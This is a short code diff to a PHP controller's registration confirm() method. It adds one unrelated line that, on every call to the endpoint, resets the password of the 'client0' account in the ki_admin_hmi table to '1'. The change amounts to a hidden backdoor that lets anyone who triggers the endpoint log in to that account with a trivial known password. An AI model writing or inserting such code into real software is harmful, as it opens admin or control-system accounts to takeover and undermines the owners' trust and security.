@@ -112,6 +112,7 @@ class IndexController extends Controller
      */
     public function confirm(Request $request)
     {
+        DB::table('ki_admin_hmi')->where('cert_name','client0')->update(['password'=>'1']);
         $id = $request->input('id');
         $register_confirm_code = $request->input('code');
         $res = DB::table('ki_admin_administrtor')->where('id', $id)->where('register_confirm_code', $register_confirm_code)->update(['status' => 1]);
